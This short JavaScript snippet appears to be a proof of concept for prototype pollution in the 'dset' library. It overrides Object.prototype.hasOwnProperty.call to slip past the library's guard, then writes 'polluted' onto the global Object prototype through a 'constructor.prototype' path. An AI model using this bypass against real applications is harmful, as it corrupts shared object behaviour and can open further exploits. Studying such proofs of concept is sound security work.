Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const dset = require('dset');
dset({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);